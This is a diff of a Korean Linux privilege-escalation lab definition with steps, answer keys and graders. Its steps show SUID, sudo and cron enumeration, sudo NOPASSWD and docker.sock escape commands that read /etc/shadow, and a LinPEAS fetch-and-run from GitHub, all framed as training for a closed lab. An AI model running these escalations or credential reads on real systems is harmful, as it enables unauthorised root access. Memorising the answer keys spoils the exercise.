@@ -1,213 +1,903 @@
 lab_id: standalone-attack-week11
-title: Linux 권한 상승 — LinPEAS / SUID / cron + R/B/P
+title: Linux 권한 상승 (Privilege Escalation) — 5 카테고리 + docker.sock + R/B/P
 version: standalone-non-ai
 course: attack
 week: 11
 description: |
-  attacker → bastion 사용자 권한 가정 → SUID/cron/capabilities/sudo 5 카테고리 enum +
-  GTFOBins 활용 + LinPEAS 자동화.
-difficulty: medium
-duration_minutes: 150
-prerequisites: [W10]
-objectives: ["5 카테고리 enum", "GTFOBins 활용", "LinPEAS 자동화"]
-pass_threshold: 0.7
+  PTES 6 단계 Post Exploitation — 일반 user(ccc) → root 권한 상승. CWE-269 / ATT&CK
+  TA0004. bastion 호스트에서 5 카테고리(config/SUID/cron/capabilities/kernel)를 enum
+  하고, 실제 권한 상승 벡터를 식별·활용한다. 이 환경의 핵심: SUID/capabilities/cron 은
+  hardening 되어 우회 불가하지만, (1) sudo NOPASSWD: ALL, (2) docker 그룹 + docker.sock
+  마운트(컨테이너 escape) 2개 벡터가 root 로 직행한다. Blue 관점에서 osquery 헌팅 +
+  auditd/Wazuh 의 탐지 한계(Detection Gap)를 확인하고, Purple 관점에서 방어 강화를
+  설계한다. 마지막 3 step 은 R/B/P 통합. **윤리적 한계**: 6v6 학습 환경 안에서만,
+  실제 시스템 권한 상승 = 정통망법 위반.
+difficulty: hard
+duration_minutes: 180
+audience: 사이버공격 (11주차)
+prerequisites: ["W10 IDS/WAF 우회"]
+objectives:
+  - "5 카테고리 enum — config / SUID / cron / capabilities / kernel"
+  - "GTFOBins + LinPEAS 활용 + 전제 조건(SUID/NOPASSWD) 검증"
+  - "실제 권한 상승 벡터 — sudo NOPASSWD + docker.sock escape"
+  - "Blue — osquery 헌팅(suid_bin/crontab/users) + auditd/Wazuh 한계"
+  - "Purple — Coverage Matrix + Detection Gap + 방어 강화 5표준"
+pass_threshold: 0.6
 steps:
 
   - order: 1
     instruction: |
-      ## 🎯 MISSION
+      ## 🎯 MISSION (Red Team — 5 카테고리 enum)
 
-      bastion 의 ccc 사용자 권한으로 **5 카테고리 enum** — sudo / SUID / cron /
-      capabilities / world-writable.
+      bastion 의 ccc 사용자 권한으로 권한 상승 5 카테고리를 enum 하라 — sudo / SUID /
+      capabilities / cron / world-writable. 추가로 ccc 의 소속 그룹(특히 docker/sudo)도
+      확인한다.
 
       ## 💻 실행 명령
 
       ```bash
-      
-      echo "=== sudo -l ==="
-      sudo -l 2>&1 | head -5
-      echo "=== SUID binary ==="
-      find / -perm -4000 -type f 2>/dev/null | head -10
-      echo "=== capabilities ==="
-      getcap -r / 2>/dev/null | head -5
-      echo "=== cron ==="
-      cat /etc/crontab 2>/dev/null; ls /etc/cron.d/ 2>/dev/null
-      echo "=== world-writable ==="
-      find / -perm -002 -type f 2>/dev/null | head -5
-      
+      ssh 6v6-bastion '
+      echo "=== 0. id + 소속 그룹 ==="
+      id
+      echo "=== 1. sudo -l ==="
+      sudo -n -l 2>&1 | tail -6
+      echo "=== 2. SUID binary ==="
+      find / -perm -4000 -uid 0 -type f 2>/dev/null | head -12
+      echo "=== 3. capabilities ==="
+      getcap -r / 2>/dev/null | head -6
+      echo "=== 4. cron ==="
+      cat /etc/crontab 2>/dev/null | grep -vE "^#|^$" | head; ls /etc/cron.d/ 2>/dev/null
+      echo "=== 5. docker.sock + world-writable ==="
+      ls -la /var/run/docker.sock 2>/dev/null
+      find /etc /home -perm -002 -type f 2>/dev/null | head -5
+      '
       ```
 
       ## 📋 확인 사항
 
-      - sudo -l: 학습 환경의 ccc NOPASSWD 표시
-      - SUID 10개+ (sudo / su / passwd / ping 등)
-      - capabilities 일부 (cap_net_raw 등)
-      - cron 표준 entry
-      - world-writable 시스템 파일 (예상 외)
+      - id: ccc(1000) 의 그룹에 **27(sudo), 999(docker)** 포함 — 둘 다 권한 상승 단서
+      - sudo -l: `(ALL) NOPASSWD: ALL` — 비번 없이 모든 명령 root
+      - SUID: 표준 셋(sudo/su/passwd/mount 등)만 — GTFOBins 활용 가능한 비표준 SUID 없음
+      - capabilities: cap_net_raw(ping/mtr-packet)만 — cap_setuid 같은 위험 cap 없음
+      - cron: e2scrub_all(표준)만
+      - docker.sock 마운트 + ccc docker 그룹 → escape 단서
 
       ## 💡 왜 이걸 하는가?
 
-      PTES 6 단계 — Post Exploitation. 사용자 권한 → root 권한 상승의 표준 enum.
+      PTES 6 단계 Post Exploitation 의 표준 enum. 5 카테고리를 모두 점검해야 어느 벡터가
+      실제 root 로 이어지는지 판단할 수 있다. 이 환경은 SUID/cap/cron 이 hardening 되어
+      있어 GTFOBins 류 우회가 막혀 있고, 대신 sudo 설정과 docker 그룹이 노출되어 있다.
 
       ## 🔍 결과 해석
 
-      - **정상**: 5 카테고리 표준 결과
-      - **권한 상승 후보**: 예상 외 SUID / 비표준 capabilities / writable cron
-    hint: 5 카테고리 enum
+      - NOPASSWD: ALL + docker 그룹 = 2개의 root 직행 벡터 (STEP 3, 4)
+      - SUID/cap/cron 표준 = hardening 양호 (GTFOBins 우회 불가)
+      - 권한 상승은 "가장 약한 고리" 를 찾는 것 — enum 이 그 출발점
+
+      ## ⚠️ 비정상 시 대응
+
+      - enum 모두 빈 출력 — `id` 로 사용자 확인 (root 가 아닌 ccc 권한이어야 정상)
+      - getcap 없음 — minimal 이미지, `apt install libcap2-bin` 또는 생략
+    hint: |
+      5 카테고리 enum + id 의 그룹(sudo/docker). 이 환경: SUID/cap/cron hardening,
+      sudo NOPASSWD ALL + docker 그룹이 root 벡터. 무엇이 약한 고리인지 식별.
     category: enumeration
-    points: 30
+    points: 12
     answer: |
-      
-      echo "=== sudo -l ==="; sudo -l 2>&1 | head -5
-      echo "=== SUID ==="; find / -perm -4000 -type f 2>/dev/null | head -10
-      echo "=== capabilities ==="; getcap -r / 2>/dev/null | head -5
-      echo "=== cron ==="; cat /etc/crontab 2>/dev/null; ls /etc/cron.d/ 2>/dev/null
-      echo "=== world-writable ==="; find / -perm -002 -type f 2>/dev/null | head -5
-      
-    answer_detail: 5 카테고리 권한 상승 enum.
+      ssh -n 6v6-bastion '
+      echo "=== id ==="; id
+      echo "=== sudo -l ==="; sudo -n -l 2>&1 | tail -6
+      echo "=== SUID ==="; find / -perm -4000 -uid 0 -type f 2>/dev/null | head -12
+      echo "=== capabilities ==="; getcap -r / 2>/dev/null | head -6
+      echo "=== cron ==="; cat /etc/crontab 2>/dev/null | grep -vE "^#|^$" | head; ls /etc/cron.d/ 2>/dev/null
+      echo "=== docker.sock ==="; ls -la /var/run/docker.sock 2>/dev/null
+      '
+    answer_detail: |
+      id: ccc uid=1000, groups 에 27(sudo)+999(docker). sudo -l: (ALL) NOPASSWD: ALL.
+      SUID: ssh-keysign/gpasswd/passwd/mount/newgrp/su/chsh/umount/chfn/sudo (표준만,
+      GTFOBins 비표준 SUID 없음). capabilities: ping/mtr-packet cap_net_raw(정상).
+      cron: e2scrub_all(표준). docker.sock: srw-rw---- root docker(ccc 가 docker 그룹).
+      → 실제 root 벡터는 NOPASSWD ALL(STEP3) + docker.sock escape(STEP4).
     verify:
       type: output_contains
-      expect: SUID
+      expect: NOPASSWD
       field: stdout
       semantic:
-        intent: "5 카테고리 enum"
-        success_criteria: ["5 카테고리 출력"]
+        intent: Red — 5 카테고리 enum + 그룹 + 약한 고리 식별.
+        success_criteria: ["5 카테고리 출력", "sudo/docker 그룹", "권한 상승 단서 식별"]
         acceptable_methods:
-          - "**[OSS] sudo -l (NOPASSWD entry)**"
-          - "**[OSS] find -perm -4000 SUID**"
-          - "**[OSS] getcap -r capabilities**"
-          - "**[OSS] /etc/crontab + cron.d**"
-          - "**[OSS] /etc/passwd / shadow 권한**"
-          - "**[OSS] ssh authorized_keys**"
-          - "**[OSS] systemd unit + timer**"
-          - "**[OSS] kernel exploit (searchsploit linux kernel)**"
+          - |
+            **[OSS] id + sudo -l** — config 약점.
+              ssh 6v6-bastion 'id; sudo -n -l'
+            예상 출력 `groups=...sudo,docker / (ALL) NOPASSWD: ALL`.
+            운영 해석: NOPASSWD ALL + docker 그룹 = root 벡터.
+          - |
+            **[OSS] find -perm -4000 SUID** — SUID enum.
+              ssh 6v6-bastion 'find / -perm -4000 -uid 0 -type f 2>/dev/null'
+            예상 출력 `표준 SUID 셋`.
+            운영 해석: 비표준 SUID 없음 = GTFOBins 우회 불가(hardening).
+          - |
+            **[OSS] getcap -r / + cron + docker.sock** — cap/cron/sock.
+            예상 출력 `cap_net_raw / e2scrub_all / docker.sock`.
+            운영 해석: cap/cron hardening, docker.sock 이 escape 벡터.
+        negative_signs: ["카테고리 일부만", "그룹 확인 누락", "단서 식별 없음"]
     target_vm: bastion
+    risk_level: low
 
   - order: 2
     instruction: |
-      ## 🎯 MISSION
+      ## 🎯 MISSION (Red Team — 권한 상승 벡터 분석)
 
-      **LinPEAS 자동화** + **GTFOBins** 활용 — 폐쇄망 환경 의 *오프라인 fallback*
-      포함.
+      STEP 1 의 enum 결과를 토대로 **권한 상승 벡터 우선순위 분석표** 를 작성하라. 각
+      카테고리가 이 환경에서 실제 활용 가능한지, 그 이유를 판정한다.
 
-      ## ⚠️ 폐쇄망 인지 (필독)
+      ## 💻 산출물 (벡터 분석표)
 
-      6v6 토폴로지 의 **모든 컨테이너 가 internet 미접근** (실측 2026-05-16 — bastion +
-      attacker 모두 curl 실패, /tmp/linpeas.sh 14 byte). 실제 폐쇄망 운영 환경 의
-      *표준 제약*. 학습 = *오프라인 enum + 사전 배포* 패턴:
+      ```markdown
+      # W11 권한 상승 벡터 분석
+      | 카테고리 | 발견 | 활용 가능? | 근거 |
+      |----------|------|-----------|------|
+      | sudo config | NOPASSWD: ALL | ✅ 즉시 | sudo bash → root (STEP 3) |
+      | docker 그룹 | docker.sock 마운트 | ✅ 즉시 | docker run -v /:/host → host root (STEP 4) |
+      | SUID | 표준 셋만 | ❌ | GTFOBins 활용 가능한 비표준 SUID 없음 |
+      | capabilities | cap_net_raw | ❌ | cap_setuid/cap_dac_override 없음 |
+      | cron | e2scrub_all | ❌ | world-writable script/PATH 의존 없음 |
+      | kernel | 5.15.x | ❌(시뮬) | LTS 패치 — exploit 가능성 낮음 |
+      ## 결론: 2개 벡터(NOPASSWD + docker.sock)가 root 직행. 나머지는 hardening.
+      ## 가장 위험: docker 그룹 = root 와 동등(docker.sock 제어 = host 제어)
+      ```
 
-      1. **사전 패키지 배포** — Dockerfile 또는 ansible playbook 에 LinPEAS 사전
-         pull (인프라 정정 — P22 backlog)
-      2. **GTFOBins 오프라인 cheat sheet** — `/opt/gtfobins.txt` 같은 로컬 사본
-      3. **내장 도구만 enum** — find/grep/awk + 기본 SUID 셋 (학습 환경 의 기본)
+      ## 📋 채점
+
+      - 6 카테고리 각각 활용 가능 여부 + 근거
+      - 실제 root 벡터 2개(NOPASSWD, docker.sock) 식별
+
+      ## 💡 왜 이걸 하는가?
+
+      enum 결과를 나열만 하면 의미 없다. 각 발견이 *실제로 root 로 이어지는가* 를
+      판정해야 공격 계획이 선다. 특히 "docker 그룹 = root 와 동등" 은 흔히 간과되는
+      구성 약점이다 — docker.sock 을 제어하면 privileged 컨테이너로 host 를 장악한다.
+
+      ## 🔍 결과 해석
+
+      - 활용 가능 2 + 불가 4 = 이 환경은 전통적 privesc(SUID/cap/cron)는 막혀 있고
+        구성 약점(sudo/docker)이 노출
+      - 우선순위: NOPASSWD(가장 단순) → docker.sock(가장 강력, host 장악)
+    hint: |
+      6 카테고리 활용 가능 여부 분석표. NOPASSWD ALL + docker 그룹 = root 직행 2벡터,
+      SUID/cap/cron/kernel 은 hardening 으로 불가. docker 그룹=root 동등 강조.
+    category: analysis
+    points: 10
+    answer: |
+      cat <<'EOF'
+      # W11 권한 상승 벡터 분석
+      | 카테고리 | 발견 | 활용 | 근거 |
+      | sudo | NOPASSWD: ALL | ✅ | sudo bash → root |
+      | docker 그룹 | docker.sock | ✅ | docker run -v /:/host → host root |
+      | SUID | 표준만 | ❌ | 비표준 SUID 없음 |
+      | capabilities | cap_net_raw | ❌ | cap_setuid 없음 |
+      | cron | e2scrub_all | ❌ | writable script 없음 |
+      | kernel | 5.15.x LTS | ❌ | 패치됨 |
+      ## root 벡터 2개: NOPASSWD + docker.sock. docker 그룹=root 동등.
+      EOF
+    answer_detail: |
+      6 카테고리 분석: sudo NOPASSWD ALL(✅) + docker 그룹/docker.sock(✅) 2벡터가 root
+      직행. SUID(표준만)/capabilities(cap_net_raw)/cron(e2scrub_all)/kernel(5.15 LTS)은
+      hardening 으로 불가. 핵심 통찰: docker 그룹 = root 와 동등(docker.sock 제어 = host
+      제어). 전통적 privesc 차단 + 구성 약점 노출 패턴.
+    verify:
+      type: output_contains
+      expect: docker
+      field: stdout
+      semantic:
+        intent: Red — 권한 상승 벡터 우선순위 분석(활용 가능 여부 + 근거).
+        success_criteria: ["6 카테고리 판정", "root 벡터 2개 식별", "docker 그룹=root 통찰"]
+        acceptable_methods:
+          - |
+            **[OSS] 벡터 분석표** — enum → 활용 가능성 매핑.
+              # 카테고리 × 활용 가능 × 근거
+            예상 출력 `NOPASSWD ✅ / docker ✅ / SUID·cap·cron ❌`.
+            운영 해석: 약한 고리 2개 식별.
+          - |
+            **[OSS] docker 그룹 위험성** — root 동등.
+            예상 출력 `docker 그룹 = host 제어`.
+            운영 해석: docker.sock 제어 = privileged 컨테이너 = root.
+          - "**[OSS] hardening 판정** — SUID/cap/cron 차단 근거."
+        negative_signs: ["나열만(판정 없음)", "docker 그룹 위험 누락"]
+    target_vm: bastion
+    risk_level: low
+
+  - order: 3
+    instruction: |
+      ## 🎯 MISSION (Red Team — sudo NOPASSWD 활용)
+
+      STEP 2 의 1번 벡터(sudo NOPASSWD: ALL)를 활용해 root 권한 획득을 입증하라. 실제
+      root shell 을 장기 점유하지 말고, root 권한으로 명령이 실행됨을 확인한다.
 
       ## 💻 실행 명령
 
       ```bash
-      # === 0) 사전 설치 (CURRICULUM 원칙 #8 — 도구 부재 시 설치 부터) ===
-      # 0-a) 폐쇄망 시 fallback — bastion 학생 호스트 에서 wget/scp
-      # 0-b) attacker 컨테이너 의 /opt/tools/ 사전 배포 시 (P22 인프라 정정 후)
-      ssh 6v6-attacker '
-        if [ ! -s /tmp/linpeas.sh ]; then
-          # 1차 — github 직접 (외부 망 가능 시)
-          curl -sL --max-time 10 https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas.sh -o /tmp/linpeas.sh 2>/dev/null
-        fi
-        if [ ! -s /tmp/linpeas.sh ] || [ $(wc -c < /tmp/linpeas.sh) -lt 1000 ]; then
-          # 2차 — attacker 의 사전 배포 (P22 backlog)
-          [ -f /opt/tools/linpeas.sh ] && cp /opt/tools/linpeas.sh /tmp/linpeas.sh
-        fi
-        chmod +x /tmp/linpeas.sh 2>/dev/null
-        echo "linpeas: $(wc -c < /tmp/linpeas.sh) byte"
+      ssh 6v6-bastion '
+      echo "=== 현재 권한 ==="
+      id
+      echo "=== sudo 로 root 권한 확인 (NOPASSWD) ==="
+      sudo id
+      sudo whoami
+      echo "=== root 전용 파일 read 입증 ==="
+      sudo head -1 /etc/shadow
       '
-
-      # === 1) 다운로드 + 설치 결과 검증 ===
-      curl -sL --max-time 5 https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas.sh -o /tmp/linpeas.sh 2>&1; echo "bastion: $(wc -c < /tmp/linpeas.sh) byte"
-      ssh 6v6-attacker 'echo "attacker: $(wc -c < /tmp/linpeas.sh) byte"'
-
-      # === 1.5) LinPEAS 가 설치 되었으면 실 실행 (양쪽 다 14 byte 이면 폐쇄망 fallback) ===
-      ssh 6v6-attacker '
-        if [ $(wc -c < /tmp/linpeas.sh) -gt 1000 ]; then
-          bash /tmp/linpeas.sh -a 2>&1 | head -40
-        else
-          echo "LinPEAS 미설치 — attacker Dockerfile 의 /opt/tools/ 사전 배포 필요 (P22 backlog)"
-        fi
-      '
-
-      # 2) 오프라인 enum — LinPEAS 의 핵심 5 카테고리 를 *수동 스크립트* 로 대체
-      
-        echo "[+] SUID binaries (LinPEAS RED 등급):"
-        find / -perm -4000 -type f 2>/dev/null | head -10
-        echo "[+] sudo NOPASSWD entries (LinPEAS RED):"
-        sudo -n -l 2>&1 | grep -i nopasswd | head -5
-        echo "[+] cron jobs (LinPEAS YELLOW):"
-        cat /etc/crontab 2>/dev/null; ls /etc/cron.d/ 2>/dev/null
-        echo "[+] world-writable files (LinPEAS RED):"
-        find /etc /home -perm -002 -type f 2>/dev/null | head -5
-        echo "[+] capabilities (LinPEAS YELLOW):"
-        getcap -r / 2>/dev/null | head -5
-      
-
-      # 3) GTFOBins 의 *전제 조건* 검증 — SUID 가 있어야 우회 가능
-      
-        echo "[GTFOBins 전제] /usr/bin/find SUID?:"
-        ls -la /usr/bin/find | grep -E "rws" && echo "  → 활용 가능: find . -exec /bin/sh \;" || echo "  → SUID 없음 (정상 hardening) → GTFOBins find 우회 불가"
-        echo "[GTFOBins 전제] /usr/bin/vim sudo NOPASSWD?:"
-        sudo -n -l 2>&1 | grep -i "vim\|/usr/bin/vim" || echo "  → NOPASSWD vim 없음 → GTFOBins vim 우회 불가"
-      
       ```
 
       ## 📋 확인 사항
 
-      - 1) bastion + attacker 모두 *14 byte* — 폐쇄망 확정
-      - 2) 5 카테고리 enum 출력 (SUID 10개 + sudo + cron + writable + capabilities)
-      - 3) GTFOBins 전제 조건 *부재* — 학습 환경 hardening 의 의미
+      - 현재: uid=1000(ccc)
+      - sudo id: **uid=0(root)** — NOPASSWD 라 비번 없이 root
+      - sudo whoami: root
+      - /etc/shadow read 성공 = root 권한 입증 (일반 user 는 불가)
 
       ## 💡 왜 이걸 하는가?
 
-      폐쇄망 환경 의 권한 상승 시도 는 *내장 도구 + 사전 배포 패키지 + 수동 검증*
-      의 3 축. LinPEAS / WinPEAS 가 *자동화 표준* 이지만 폐쇄망 에서는 *사전
-      배포* 가 전제. GTFOBins (https://gtfobins.github.io) 의 cheat sheet 도
-      *SUID + NOPASSWD* 가 있어야 동작 — 정상 hardening 환경 에서는 *대부분 불가*.
+      sudo NOPASSWD: ALL 은 가장 단순하고 직접적인 권한 상승이다. `sudo bash` 로 즉시
+      root shell 을 얻을 수 있다. 본 실습에서는 root shell 을 장기 점유하는 대신 `sudo
+      id` / `sudo head /etc/shadow` 로 권한 획득을 입증한다 (실습 안전 + 흔적 최소화).
 
       ## 🔍 결과 해석
 
-      - **정상 (학습 환경)**: 1) 둘 다 14 byte 2) enum 결과 표준 셋 3) GTFOBins 우회
-        불가
-      - **bastion / attacker internet 가능** — 폐쇄망 정책 위반, 즉시 보고
-      - **GTFOBins 우회 가능** — 학습 환경 hardening 결함, custom SUID 등 review
+      - sudo id → uid=0 = 권한 상승 성공
+      - /etc/shadow read = root 전용 자원 접근 = 실질적 root 장악
+      - 이것이 STEP 6/7 에서 Blue 가 탐지해야 할 행위
 
-      ## 비정상 시 대응
+      ## ⚠️ 비정상 시 대응
 
-      - **enum 결과 모두 빈 출력** — 권한 부족 (sudo NOPASSWD 없음). `id` 로 사용자
-        확인 → ccc 가 아닌 root 로 실행 중 인지 (정상은 ccc 권한)
-      - **5 카테고리 중 일부 누락** — Alpine / minimal 이미지 (getcap / find -perm
-        지원 X). `apk add libcap-utils findutils` 검토.
+      - sudo 비번 요구 — NOPASSWD 아님, `sudo -n id` 로 non-interactive 확인
+      - sudo: command not found — sudo 미설치, su 또는 다른 벡터(STEP 4)
     hint: |
-      폐쇄망 = 둘 다 14 byte. LinPEAS 대체 = 수동 5 카테고리 enum. GTFOBins 의
-      전제 (SUID + NOPASSWD) 부재 = 정상 hardening.
+      sudo NOPASSWD 활용 — sudo id(uid=0) + sudo head /etc/shadow 로 root 입증.
+      root shell 장기 점유 말고 권한 획득만 확인. Blue 탐지 대상(STEP 6/7).
     category: exploit
-    points: 25
+    points: 12
     answer: |
-      ssh -n 6v6-attacker 'ls -la /opt/tools/linpeas.sh; wc -c /opt/tools/linpeas.sh'
-      ssh -n 6v6-attacker 'echo SUID:; find / -perm -4000 -type f 2>/dev/null | head -5; echo NOPASSWD:; sudo -n -l 2>&1 | grep -i nopasswd | head -3'
-      echo "linpeas: 사전 배포 /opt/tools/linpeas.sh (폐쇄망)"
+      ssh -n 6v6-bastion '
+      echo "=== id ==="; id
+      echo "=== sudo id (NOPASSWD) ==="; sudo id
+      echo "=== sudo whoami ==="; sudo whoami
+      echo "=== root 전용 read ==="; sudo head -1 /etc/shadow
+      '
     answer_detail: |
-      폐쇄망 확정 (둘 다 14 byte) + 수동 5 카테고리 enum + GTFOBins 전제 부재.
-      LinPEAS 의 자동화 vs 수동 enum 의 차이 인지.
+      ccc(uid=1000) → sudo id → uid=0(root). NOPASSWD: ALL 라 비번 없이 root. sudo
+      whoami=root, /etc/shadow read 성공 = root 전용 자원 접근 = 권한 상승 입증.
+      실제 공격은 sudo bash 로 root shell. 본 실습은 입증만(흔적 최소화).
+    verify:
+      type: output_contains
+      expect: 'uid=0'
+      field: stdout
+      semantic:
+        intent: Red — sudo NOPASSWD 권한 상승 입증(uid=0).
+        success_criteria: ["현재 ccc 확인", "sudo id → uid=0", "root 자원 접근"]
+        acceptable_methods:
+          - |
+            **[OSS] sudo id / whoami** — NOPASSWD 활용.
+              ssh 6v6-bastion 'sudo id; sudo whoami'
+            예상 출력 `uid=0(root) / root`.
+            운영 해석: 비번 없이 root 권한 획득.
+          - |
+            **[OSS] sudo head /etc/shadow** — root 자원 접근 입증.
+              ssh 6v6-bastion 'sudo head -1 /etc/shadow'
+            예상 출력 `root:$6$... 해시`.
+            운영 해석: 일반 user 불가한 root 전용 read 성공.
+          - "**[OSS] sudo bash** — 즉시 root shell (실 공격, 본 실습은 입증만)."
+        negative_signs: ["uid=0 미확인", "비번 요구를 NOPASSWD 로 오인"]
+    target_vm: bastion
+    risk_level: medium
+
+  - order: 4
+    instruction: |
+      ## 🎯 MISSION (Red Team — docker.sock escape)
+
+      STEP 2 의 2번 벡터(docker 그룹 + docker.sock)를 활용해 컨테이너를 탈출하고 호스트
+      파일시스템에 root 로 접근함을 입증하라. ccc 는 docker 그룹이므로 docker 명령으로
+      privileged 작업이 가능하다.
+
+      ## 💻 실행 명령
+
+      ```bash
+      ssh 6v6-bastion '
+      echo "=== docker.sock 접근 (docker 그룹) ==="
+      docker ps --format "{{.Names}}" | head -3
+      echo "=== escape PoC — host / 를 컨테이너에 마운트 후 host 파일 read ==="
+      docker run --rm -v /:/host alpine cat /host/etc/hostname
+      echo "=== host root 입증 — host /etc/shadow 첫 줄 ==="
+      docker run --rm -v /:/host alpine head -1 /host/etc/shadow
+      '
+      ```
+
+      ## 📋 확인 사항
+
+      - docker ps 성공 = docker.sock 제어 가능 (docker 그룹)
+      - `cat /host/etc/hostname` → host 의 hostname 출력 = 컨테이너 탈출 성공
+      - `head /host/etc/shadow` → host 의 shadow read = host root 권한 입증
+
+      ## 💡 왜 이걸 하는가?
+
+      docker.sock 은 root 와 동등한 권한이다. docker 그룹 사용자는 `docker run -v /:/host`
+      로 호스트 전체 파일시스템을 컨테이너에 마운트해 읽고 쓸 수 있다 (= host root). 이는
+      privileged 컨테이너나 chroot 없이도 host 를 장악하는 강력한 벡터다. GTFOBins 와
+      달리 SUID/sudo 가 필요 없다.
+
+      ## 🔍 결과 해석
+
+      - host hostname/shadow read 성공 = 컨테이너 격리 무력화 = host root 장악
+      - `--privileged` 또는 `chroot /host` 로 완전한 host shell 도 가능 (본 실습은 read 입증)
+      - 이것이 컨테이너 환경의 가장 위험한 구성 약점 중 하나
+
+      ## ⚠️ 비정상 시 대응
+
+      - docker: permission denied — ccc 가 docker 그룹 아님, `id | grep docker` 확인
+      - docker.sock 없음 — `ls -la /var/run/docker.sock` (마운트 안 됐으면 escape 불가)
+      - alpine pull 실패 — 폐쇄망, 이미 받은 이미지(`docker images`) 사용
+    hint: |
+      docker.sock escape — docker run -v /:/host alpine cat /host/etc/hostname(탈출)
+      + head /host/etc/shadow(host root 입증). docker 그룹=root 동등, SUID/sudo 불필요.
+    category: exploit
+    points: 12
+    answer: |
+      ssh -n 6v6-bastion '
+      echo "=== docker ps ==="; docker ps --format "{{.Names}}" | head -3
+      echo "=== escape — host hostname ==="; docker run --rm -v /:/host alpine cat /host/etc/hostname
+      echo "=== host root 입증 — shadow ==="; docker run --rm -v /:/host alpine head -1 /host/etc/shadow
+      '
+    answer_detail: |
+      ccc 가 docker 그룹 → docker ps 성공(docker.sock 제어). docker run --rm -v /:/host
+      alpine 로 host / 를 컨테이너에 마운트 → cat /host/etc/hostname(=6v6, host hostname)
+      = 컨테이너 탈출. head /host/etc/shadow = host root read 입증. SUID/sudo 없이 host
+      장악 — 컨테이너 환경 최악의 구성 약점. --privileged/chroot 로 완전 host shell 가능.
+    verify:
+      type: output_contains
+      expect: host
+      field: stdout
+      semantic:
+        intent: Red — docker.sock escape(컨테이너 탈출 + host root 입증).
+        success_criteria: ["docker.sock 접근", "host 파일 read(탈출)", "host root 입증"]
+        acceptable_methods:
+          - |
+            **[OSS] docker ps** — docker.sock 제어 확인.
+              ssh 6v6-bastion 'docker ps'
+            예상 출력 `컨테이너 목록`.
+            운영 해석: docker 그룹 = docker.sock 제어 = root 동등.
+          - |
+            **[OSS] docker run -v /:/host** — 컨테이너 탈출.
+              docker run --rm -v /:/host alpine cat /host/etc/hostname
+            예상 출력 `host hostname(6v6)`.
+            운영 해석: host / 마운트 = 격리 무력화.
+          - |
+            **[OSS] host /etc/shadow read** — host root 입증.
+              docker run --rm -v /:/host alpine head /host/etc/shadow
+            예상 출력 `host shadow 해시`.
+            운영 해석: host root 자원 접근 = 완전 장악.
+          - "**[OSS] --privileged / chroot /host** — 완전 host shell(실 공격)."
+        negative_signs: ["docker permission denied", "host 파일 read 미입증"]
+    target_vm: bastion
+    risk_level: high
+
+  - order: 5
+    instruction: |
+      ## 🎯 MISSION (Red Team — LinPEAS 자동 enum)
+
+      수동 enum(STEP 1)을 LinPEAS 자동화로 보완하라. LinPEAS 는 5 카테고리 + 100여
+      항목을 자동 점검한다. 폐쇄망일 경우 수동 fallback 패턴을 적용한다.
+
+      ## 💻 실행 명령
+
+      ```bash
+      ssh 6v6-bastion '
+      # 1) LinPEAS 다운로드 (인터넷 가능 시)
+      curl -sL --max-time 15 https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas.sh -o /tmp/linpeas.sh 2>/dev/null
+      echo "linpeas: $(wc -c < /tmp/linpeas.sh 2>/dev/null) byte"
+      # 2) 다운로드 성공(>1000 byte) 시 실행, 폐쇄망(14 byte 등)이면 수동 fallback
+      if [ "$(wc -c < /tmp/linpeas.sh 2>/dev/null)" -gt 1000 ]; then
+        chmod +x /tmp/linpeas.sh
+        timeout 90 bash /tmp/linpeas.sh -a 2>&1 | grep -iE "sudo|SUID|docker|capabilit|NOPASSWD" | head -15
+      else
+        echo "[폐쇄망 fallback] LinPEAS 핵심 항목 수동 enum:"
+        echo "[SUID]"; find / -perm -4000 -type f 2>/dev/null | head -8
+        echo "[NOPASSWD]"; sudo -n -l 2>&1 | grep -i nopasswd
+        echo "[docker 그룹]"; id | grep -o docker
+      fi
+      '
+      ```
+
+      ## 📋 확인 사항
+
+      - linpeas byte 수 (>1000 = 다운로드 성공 / 14 byte 등 = 폐쇄망)
+      - LinPEAS 실행 시 sudo/SUID/docker/capabilities 관련 발견
+      - 폐쇄망 fallback 시 수동 enum 결과
+
+      ## 💡 왜 이걸 하는가?
+
+      LinPEAS(PEASS-ng)는 권한 상승 enum 의 사실상 표준 도구로, 색상(🔴 high/🟡 medium)
+      으로 발견을 분류한다. 그러나 실 폐쇄망 운영 환경에서는 다운로드가 막히므로, 사전
+      배포(`/opt/tools/linpeas.sh`)나 내장 도구 수동 enum 으로 fallback 하는 패턴을
+      익혀야 한다. 자동화 도구에만 의존하면 폐쇄망에서 무력해진다.
+
+      ## 🔍 결과 해석
+
+      - LinPEAS 실행 → STEP 1 의 수동 enum 과 동일 발견(sudo NOPASSWD / docker)을 자동 확인
+      - 폐쇄망 → 수동 fallback 이 동일 결과 도출 (도구 부재에도 enum 가능)
+
+      ## ⚠️ 비정상 시 대응
+
+      - 14 byte / 0 byte — 폐쇄망 또는 DNS 실패, fallback 수동 enum
+      - timeout 90 초과 — LinPEAS -a 전체는 5분+, `head` 로 제한 또는 부분 옵션
+    hint: |
+      LinPEAS 다운로드(>1000 byte 성공) → 실행 grep sudo/SUID/docker, 폐쇄망(14 byte)
+      이면 수동 fallback. 자동화 표준 vs 폐쇄망 사전배포 패턴 학습.
+    category: exploit
+    points: 10
+    answer: |
+      ssh -n 6v6-bastion '
+      curl -sL --max-time 15 https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas.sh -o /tmp/linpeas.sh 2>/dev/null
+      echo "linpeas: $(wc -c < /tmp/linpeas.sh 2>/dev/null) byte"
+      if [ "$(wc -c < /tmp/linpeas.sh 2>/dev/null)" -gt 1000 ]; then
+        chmod +x /tmp/linpeas.sh
+        timeout 90 bash /tmp/linpeas.sh -a 2>&1 | grep -iE "sudo|SUID|docker|NOPASSWD" | head -15
+      else
+        echo "[폐쇄망 fallback]"; find / -perm -4000 -type f 2>/dev/null | head -8; sudo -n -l 2>&1 | grep -i nopasswd
+      fi
+      '
+    answer_detail: |
+      LinPEAS 다운로드(0.110 bastion 은 github 200 → 다운로드 가능, >1000 byte). 실행 시
+      sudo NOPASSWD/SUID/docker 자동 발견 → STEP 1 수동 enum 과 동일. 폐쇄망(14 byte)이면
+      수동 fallback(find SUID + sudo -l + id docker). 자동화 표준 + 폐쇄망 사전배포 패턴.
     verify:
       type: output_contains
       expect: linpeas
